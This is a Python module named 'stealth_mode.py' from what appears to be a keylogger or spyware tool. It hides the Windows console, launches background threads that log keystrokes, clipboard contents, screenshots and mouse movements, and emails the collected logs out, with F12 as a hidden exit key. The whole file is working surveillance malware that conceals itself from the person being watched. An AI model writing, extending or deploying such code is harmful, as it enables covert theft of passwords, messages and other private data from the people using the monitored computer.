# modules/stealth_mode.py (update exit logic)

from pynput import keyboard
import os
import ctypes
import threading
from modules import keystroke_logger, clipboard_logger, screenshot_capture, mouse_tracker, email_sender

def hide_console():
    ctypes.windll.user32.ShowWindow(ctypes.windll.kernel32.GetConsoleWindow(), 0)

def show_console():
    ctypes.windll.user32.ShowWindow(ctypes.windll.kernel32.GetConsoleWindow(), 1)

def show_exit_popup():
    ctypes.windll.user32.MessageBoxW(0, "Stealth mode exited successfully.", "Monitoring Ended", 0x40)

def start_all_loggers(user_folder):
    threading.Thread(target=keystroke_logger.start_logger, args=(user_folder,), daemon=True).start()
    threading.Thread(target=clipboard_logger.start_logger, args=(user_folder,), daemon=True).start()
    threading.Thread(target=screenshot_capture.start_logger, args=(user_folder,), daemon=True).start()
    threading.Thread(target=mouse_tracker.start_logger, args=(user_folder,), daemon=True).start()

def on_press(key):
    print(f"[DEBUG] Key pressed: {key}")
    if key == keyboard.Key.f12:
        show_console()
        show_exit_popup()
        os._exit(0)

def on_release(key):
    pass  # Not needed for F12

def listen_for_exit_hotkey():
    with keyboard.Listener(on_press=on_press, on_release=on_release) as listener:
        listener.join()

def start_stealth_mode(user_folder):
    print("[INFO] Starting in stealth mode...")
    hide_console()
    start_all_loggers(user_folder)
    email_sender.send_logs_via_email(user_folder)
    listen_for_exit_hotkey()
